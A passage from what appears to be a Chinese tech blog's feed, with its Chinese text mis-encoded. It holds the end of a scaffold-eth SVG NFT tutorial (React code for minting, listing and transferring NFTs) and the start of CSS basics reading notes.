id="nft-gong-neng-shi-xian">NFT åŠŸèƒ½å®ç°</span></h2><p>æˆ‘ä»¬å°†ä¸»è¦å®ç°ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†åŠŸèƒ½ï¼š</p><ul><li>é“¸é€  NFTï¼›</li><li>å±•ç¤º NFT åˆ—è¡¨ï¼›</li><li>å±•ç¤º NFT åˆçº¦æ¥å£åˆ—è¡¨ã€‚</li></ul><h3><span id="zhu-zao-nft">é“¸é€  NFT</span></h3><p>é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ° <code>App Home</code> å¯¹åº”ä½¿ç”¨çš„ç»„ä»¶ï¼Œä»ä¸‹é¢çš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¯¹åº”ä½¿ç”¨ <code>Home</code> ç»„ä»¶ï¼Œæ‰€åœ¨ä½ç½®ä¸º <code>src/views/Home.jsx</code> ã€‚</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* pass in any web3 props to this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Home</span> <span class="attr">yourLocalBalance</span>=<span class="string">&#123;yourLocalBalance&#125;</span> <span class="attr">readContracts</span>=<span class="string">&#123;readContracts&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>åˆ é™¤ <code>Home.jsx</code> ä¸­å†…å®¹ï¼Œæ·»åŠ ä»¥ä¸‹ Mint æŒ‰é’®ï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">Card</span>, <span class="title class_">List</span> &#125; <span class="keyword">from</span> <span class="string">&quot;antd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params">&#123; </span></span><br><span class="line"><span class="params">  isSigner,</span></span><br><span class="line"><span class="params">  loadWeb3Modal,</span></span><br><span class="line"><span class="params">  tx,</span></span><br><span class="line"><span class="params">  writeContracts,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* Mint button */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">maxWidth:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">marginTop:</span> <span class="attr">32</span>, <span class="attr">paddingBottom:</span> <span class="attr">32</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;isSigner?(</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">&#123;</span>&quot;<span class="attr">primary</span>&quot;&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-xml">            tx( writeContracts.YourCollectible.mintItem() )</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;&gt;MINT<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ):(</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">&#123;</span>&quot;<span class="attr">primary</span>&quot;&#125; <span class="attr">onClick</span>=<span class="string">&#123;loadWeb3Modal&#125;</span>&gt;</span>CONNECT WALLET<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        )&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>åŒæ—¶å°† <code>Switch</code> ä¸­å¯¹åº”ç»„ä»¶ä½¿ç”¨ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* pass in any web3 props to this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Home</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">isSigner</span>=<span class="string">&#123;userSigner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">loadWeb3Modal</span>=<span class="string">&#123;loadWeb3Modal&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">tx</span>=<span class="string">&#123;tx&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">writeContracts</span>=<span class="string">&#123;writeContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml"> ...</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾ä¸ºï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/153822638-2ce70ded-289b-411e-9ed5-c78507617427.png" alt="mint-button"></p><p>ç‚¹å‡» Mint ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº¤æ˜“æˆåŠŸå‘å‡ºï¼Œè¿™æ—¶ï¼Œè™½ç„¶æˆ‘ä»¬æˆåŠŸ mint äº† NFTï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ·»åŠ åˆ—è¡¨æ¥å±•ç¤ºæˆ‘ä»¬çš„ NFTã€‚</p><h3><span id="zhan-shi-nft-lie-biao">å±•ç¤º NFT åˆ—è¡¨</span></h3><p>æ·»åŠ åˆ—è¡¨å±•ç¤ºï¼Œå…¶ä¸­åŒ…å« NFT çš„è½¬ç§»åŠŸèƒ½å¯ä»¥å°†å¯¹åº”çš„ NFT å‘é€ç»™å…¶ä»–åœ°å€ã€‚</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">Card</span>, <span class="title class_">List</span> &#125; <span class="keyword">from</span> <span class="string">&quot;antd&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useContractReader &#125; <span class="keyword">from</span> <span class="string">&quot;eth-hooks&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Address</span>, <span class="title class_">AddressInput</span>&#125; <span class="keyword">from</span> <span class="string">&quot;../components&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params">&#123; </span></span><br><span class="line"><span class="params">  isSigner,</span></span><br><span class="line"><span class="params">  loadWeb3Modal,</span></span><br><span class="line"><span class="params">  yourCollectibles,</span></span><br><span class="line"><span class="params">  address,</span></span><br><span class="line"><span class="params">  blockExplorer,</span></span><br><span class="line"><span class="params">  mainnetProvider,</span></span><br><span class="line"><span class="params">  tx,</span></span><br><span class="line"><span class="params">  readContracts,</span></span><br><span class="line"><span class="params">  writeContracts,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [transferToAddresses, setTransferToAddresses] = <span class="title function_">useState</span>(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* Mint æŒ‰é’® */&#125;</span></span><br><span class="line"><span class="language-xml">...</span></span><br><span class="line"><span class="language-xml">&#123;/* åˆ—è¡¨ */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">width:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">paddingBottom:</span> <span class="attr">256</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">List</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">bordered</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">dataSource</span>=<span class="string">&#123;yourCollectibles&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">renderItem</span>=<span class="string">&#123;item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">            const id = item.id.toNumber();</span></span><br><span class="line"><span class="language-xml">            console.log(&quot;IMAGE&quot;,item.image)</span></span><br><span class="line"><span class="language-xml">            return (</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">List.Item</span> <span class="attr">key</span>=<span class="string">&#123;id</span> + &quot;<span class="attr">_</span>&quot; + <span class="attr">item.uri</span> + &quot;<span class="attr">_</span>&quot; + <span class="attr">item.owner</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">Card</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                  <span class="attr">title</span>=<span class="string">&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    &lt;<span class="attr">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> <span class="attr">18</span>, <span class="attr">marginRight:</span> <span class="attr">8</span> &#125;&#125;&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  &#125;</span></span><br><span class="line"><span class="language-xml">                &gt;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#123;</span>&quot;<span class="attr">https:</span>//<span class="attr">opensea.io</span>/<span class="attr">assets</span>/&quot;+(<span class="attr">readContracts</span> &amp;&amp; <span class="attr">readContracts.YourCollectible</span> &amp;&amp; <span class="attr">readContracts.YourCollectible.address</span>)+&quot;/&quot;+<span class="attr">item.id</span>&#125; <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;item.image&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;item.description&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&#123;/* NFT è½¬ç§» */&#125;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  owner:&#123;&quot; &quot;&#125;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">Address</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">address</span>=<span class="string">&#123;item.owner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">ensProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">blockExplorer</span>=<span class="string">&#123;blockExplorer&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">fontSize</span>=<span class="string">&#123;16&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                  /&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">AddressInput</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">ensProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">placeholder</span>=<span class="string">&quot;transfer to address&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">value</span>=<span class="string">&#123;transferToAddresses[id]&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">onChange</span>=<span class="string">&#123;newValue</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">                      const update = &#123;&#125;;</span></span><br><span class="line"><span class="language-xml">                      update[id] = newValue;</span></span><br><span class="line"><span class="language-xml">                      setTransferToAddresses(&#123; ...transferToAddresses, ...update &#125;);</span></span><br><span class="line"><span class="language-xml">                    &#125;&#125;</span></span><br><span class="line"><span class="language-xml">                  /&gt;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">Button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">                      console.log(&quot;writeContracts&quot;, writeContracts);</span></span><br><span class="line"><span class="language-xml">                      tx(writeContracts.YourCollectible.transferFrom(address, transferToAddresses[id], id));</span></span><br><span class="line"><span class="language-xml">                    &#125;&#125;</span></span><br><span class="line"><span class="language-xml">                  &gt;</span></span><br><span class="line"><span class="language-xml">                    Transfer</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">List.Item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            );</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* ä¿¡æ¯æç¤º */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">maxWidth:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">marginTop:</span> <span class="attr">32</span>, <span class="attr">paddingBottom:</span> <span class="attr">256</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        ğŸ›  built with <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/austintgriffith/scaffold-eth&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>ğŸ— scaffold-eth<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ğŸ´ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/austintgriffith/scaffold-eth&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Fork this repo<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and build a cool SVG NFT!</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>å¯¹åº”ç»„ä»¶ä½¿ç”¨ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* pass in any web3 props to this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Home</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">isSigner</span>=<span class="string">&#123;userSigner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">loadWeb3Modal</span>=<span class="string">&#123;loadWeb3Modal&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">yourCollectibles</span>=<span class="string">&#123;yourCollectibles&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">address</span>=<span class="string">&#123;address&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">blockExplorer</span>=<span class="string">&#123;blockExplorer&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">mainnetProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">tx</span>=<span class="string">&#123;tx&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">writeContracts</span>=<span class="string">&#123;writeContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">readContracts</span>=<span class="string">&#123;readContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml"> ...</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾ä¸ºï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/153822686-e7f7c3c7-65ee-4b1c-ade2-204c6365177f.png" alt="nft-display-list"></p><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œå½“æˆ‘ä»¬å†æ¬¡ mint æ—¶ï¼Œåˆ—è¡¨å¹¶ä¸ä¼šæ›´æ–°ï¼Œè¿˜æ˜¯åŸæ¥çš„æ ·å­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ <code>App.jsx</code> ä¸­æ·»åŠ äº‹ä»¶ç›‘å¬ï¼Œä¸€æ—¦æˆ‘ä»¬é“¸é€  NFT ä¹‹åï¼Œåˆ—è¡¨å°†åˆ·æ–°ï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·Ÿè¸ªå½“å‰ NFT æ•°é‡</span></span><br><span class="line"><span class="keyword">const</span> balance = <span class="title function_">useContractReader</span>(readContracts, <span class="string">&quot;YourCollectible&quot;</span>, <span class="string">&quot;balanceOf&quot;</span>, [address]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ¤— balance:&quot;</span>, balance);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> yourBalance = balance &amp;&amp; balance.<span class="property">toNumber</span> &amp;&amp; balance.<span class="title function_">toNumber</span>();</span><br><span class="line"><span class="keyword">const</span> [yourCollectibles, setYourCollectibles] = <span class="title function_">useState</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ğŸ§  è¿™ä¸ª effect ä¼šåœ¨ balance å˜åŒ–æ—¶æ›´æ–° yourCollectibles </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">updateYourCollectibles</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> collectibleUpdate = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> tokenIndex = <span class="number">0</span>; tokenIndex &lt; balance; tokenIndex++) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;GEtting token index&quot;</span>, tokenIndex);</span><br><span class="line">        <span class="keyword">const</span> tokenId = <span class="keyword">await</span> readContracts.<span class="property">YourCollectible</span>.<span class="title function_">tokenOfOwnerByIndex</span>(address, tokenIndex);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tokenId&quot;</span>, tokenId);</span><br><span class="line">        <span class="keyword">const</span> tokenURI = <span class="keyword">await</span> readContracts.<span class="property">YourCollectible</span>.<span class="title function_">tokenURI</span>(tokenId);</span><br><span class="line">        <span class="keyword">const</span> jsonManifestString = <span class="title function_">atob</span>(tokenURI.<span class="title function_">substring</span>(<span class="number">29</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jsonManifestString&quot;</span>, jsonManifestString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> jsonManifest = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonManifestString);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;jsonManifest&quot;</span>, jsonManifest);</span><br><span class="line">          collectibleUpdate.<span class="title function_">push</span>(&#123; <span class="attr">id</span>: tokenId, <span class="attr">uri</span>: tokenURI, <span class="attr">owner</span>: address, ...jsonManifest &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setYourCollectibles</span>(collectibleUpdate.<span class="title function_">reverse</span>());</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">updateYourCollectibles</span>();</span><br><span class="line">&#125;, [address, yourBalance]);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå½“æˆ‘ä»¬å†æ¬¡ Mint æ—¶ï¼Œå°±æ˜¯è‡ªåŠ¨æ›´æ–°åˆ—è¡¨ï¼Œæ˜¾ç¤ºæœ€æ–°é“¸é€ çš„ NFT äº†ã€‚</p><h3><span id="zhan-shi-nft-he-yue-jie-kou-lie-biao">å±•ç¤º NFT åˆçº¦æ¥å£åˆ—è¡¨</span></h3><p>è¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ä¿®æ”¹å¯¹åº” debug éƒ¨åˆ†å³å¯ï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Route</span> exact path=<span class="string">&quot;/debug&quot;</span>&gt;</span><br><span class="line">    &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment">          ğŸ› this scaffolding is full of commonly used components</span></span><br><span class="line"><span class="comment">          this &lt;Contract/&gt; component will automatically parse your ABI</span></span><br><span class="line"><span class="comment">          and give you a form to interact with it locally</span></span><br><span class="line"><span class="comment">      */</span>&#125;</span><br><span class="line"></span><br><span class="line">    &lt;<span class="title class_">Contract</span></span><br><span class="line">      name=<span class="string">&quot;YourCollectible&quot;</span></span><br><span class="line">      price=&#123;price&#125;</span><br><span class="line">      signer=&#123;userSigner&#125;</span><br><span class="line">      provider=&#123;localProvider&#125;</span><br><span class="line">      address=&#123;address&#125;</span><br><span class="line">      blockExplorer=&#123;blockExplorer&#125;</span><br><span class="line">      contractConfig=&#123;contractConfig&#125;</span><br><span class="line">    /&gt;</span><br></pre></td></tr></table></figure><p>æ›´æ–°ä¹‹åï¼Œå¯ä»¥åœ¨ <code>Debug Contracts</code> èœå•ä¸‹çœ‹åˆ°åˆçº¦çš„å¯ä»¥è°ƒç”¨çš„å‡½æ•°ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/153822741-30c8d3c6-077b-49b9-8b88-bc62119215cf.png" alt="contract-funcs"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ä¸€ä¸ªç®€å• NFT é“¸é€ å’Œå±•ç¤ºçš„ DApp äº†ã€‚</p><h2><span id="zong-jie">æ€»ç»“</span></h2><p>é€šè¿‡è¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥å­¦ä¹ å¹¶äº†è§£ä»¥ä¸‹çŸ¥è¯†ï¼š</p><ol><li>NFT åˆçº¦åŸºæœ¬å†…å®¹ä»¥åŠå¦‚ä½•åœ¨ Opensea ç­‰å¸‚åœºä¸­å±•ç¤º NFTï¼›</li><li>å‰ç«¯å¦‚ä½•è¿æ¥è¯¸å¦‚ MetaMask ç­‰é’±åŒ…ï¼›</li><li>å‰ç«¯å¦‚ä½•è°ƒç”¨åˆçº¦å‡½æ•°ã€‚</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      SVG NFT å…¨é¢å®è·µ â”€â”€ scaffold-eth loogies-svg-nft é¡¹ç›®å®Œæ•´æŒ‡å—
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CSS åŸºç¡€â”€â”€æ ·å¼ç¯‡</title>
    <link href="https://qiwihui.com/qiwihui-blog-147/"/>
    <id>https://qiwihui.com/qiwihui-blog-147/</id>
    <published>2024-05-15T02:25:31.390Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>ã€Š<a href="https://lefex.github.io/books/html-book/introduction.html">å‰ç«¯å°è¯¾â”€â”€ç”¨å¥½HTML</a>ã€‹çš„è¯»ä¹¦ç¬”è®°ã€‚</p><h3><span id="shi-yong-css-san-chong-fang-shi">ä½¿ç”¨cssä¸‰ç§æ–¹å¼</span></h3><ol><li><p>å¤–éƒ¨å¼•å…¥ï¼šé€šè¿‡ link çš„æ–¹å¼å¼•ç”¨ CSS æ ·å¼</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>å†…éƒ¨å¼•å…¥ï¼Œåœ¨ HTML ä¸­çš„ head ä½ç½®æ·»åŠ  style æ ‡ç­¾</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>å†…è”æ ·å¼</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: red; font-size: 18px;&quot;</span>&gt;</span>å†…å®¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3><span id="kuai-ji-biao-qian-he-inline-biao-qian">å—çº§æ ‡ç­¾å’Œ inline æ ‡ç­¾</span></h3><ul><li>å—çº§æ ‡ç­¾ç‹¬å ä¸€è¡Œï¼›</li><li>inline æ ‡ç­¾ä¼šã€Œç´¯åŠ ã€ï¼Œå¦‚åŒæ‰“å­—ä¸€æ 